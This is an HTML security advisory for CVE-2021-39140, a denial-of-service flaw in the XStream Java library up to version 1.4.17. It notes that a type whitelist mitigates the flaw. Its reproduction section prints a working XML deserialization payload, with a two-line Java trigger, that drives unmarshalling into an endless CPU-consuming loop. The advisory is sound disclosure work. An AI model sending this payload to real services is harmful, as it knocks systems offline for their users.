    <h2 id="vulnerability">Vulnerability</h2>
    
    <p>CVE-2021-39140: XStream is vulnerable to a Denial of Service attack.</p>
    
    <h2 id="affected_versions">Affected Versions</h2>
    
    <p>All versions until and including version 1.4.17 are affected, if using the version out of the box.  No user is
    affected, who followed the recommendation to setup <a href="security.html#framework">XStream's security framework
    </a> with a whitelist limited to the minimal required types.</p>

    <h2 id="description">Description</h2>
    
    <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.
    XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed
    input stream and replace or inject objects, that result in an endless loop probably causing a denial of service.</p>

    <h2 id="reproduction">Steps to Reproduce</h2>

    <p>Create a simple TreeSet and use XStream to marshal it to XML.  Replace the XML with following snippet and
    unmarshal it again with XStream:</p>
<div class="Source XML"><pre>&lt;linked-hash-set&gt;
  &lt;sun.reflect.annotation.AnnotationInvocationHandler serialization='custom'&gt;
    &lt;sun.reflect.annotation.AnnotationInvocationHandler&gt;
      &lt;default&gt;
        &lt;memberValues class='javax.script.SimpleBindings'&gt;
          &lt;map class='javax.script.SimpleBindings' reference='..'/&gt;
        &lt;/memberValues&gt;
        &lt;type&gt;javax.xml.transform.Templates&lt;/type&gt;
      &lt;/default&gt;
    &lt;/sun.reflect.annotation.AnnotationInvocationHandler&gt;
  &lt;/sun.reflect.annotation.AnnotationInvocationHandler&gt;
&lt;/linked-hash-set&gt;
</pre></div>
<div class="Source Java"><pre>XStream xstream = new XStream();
xstream.fromXML(xml);
</pre></div>

    <p>As soon as the XML gets unmarshalled, the an endless loop is entered and the executing thread consumes maximum
    CPU time and will never return.</p>

    <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>

    <h2 id="impact">Impact</h2>

    <p>The vulnerability may allow a remote attacker to allocate 100% CPU time on the target system depending on CPU
    type or parallel execution of such a payload resulting in a denial of service only by manipulating the processed
    input stream.</p>
